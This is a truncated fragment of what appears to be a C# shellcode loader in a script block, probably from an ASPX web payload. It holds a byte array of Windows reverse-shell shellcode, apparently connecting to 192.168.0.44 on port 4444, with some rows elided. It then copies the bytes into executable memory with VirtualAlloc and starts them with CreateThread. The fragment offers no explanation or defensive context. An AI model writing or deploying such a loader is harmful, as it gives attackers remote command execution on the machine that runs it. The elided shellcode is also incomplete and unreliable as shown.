...
0xff,0x0f,0xb7,0x4a,0x26,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0x49,0x75,0xef,0x52,0x8b,0x52,
0x10,0x8b,0x42,0x3c,0x57,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0x50,
...
0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0xc0,0xa8,0x00,0x2c,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,
...
0x00,0x53,0xff,0xd5 };
        ...
        IntPtr r0HvE8f = VirtualAlloc(IntPtr.Zero,(UIntPtr)kO2xJIPk.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(kO2xJIPk,0,r0HvE8f,kO2xJIPk.Length);
        IntPtr zOVYLJC8ZRld = IntPtr.Zero;
        IntPtr oTY0ajSJjy = CreateThread(IntPtr.Zero,UIntPtr.Zero,r0HvE8f,IntPtr.Zero,0,ref zOVYLJC8ZRld);
    }
</script>
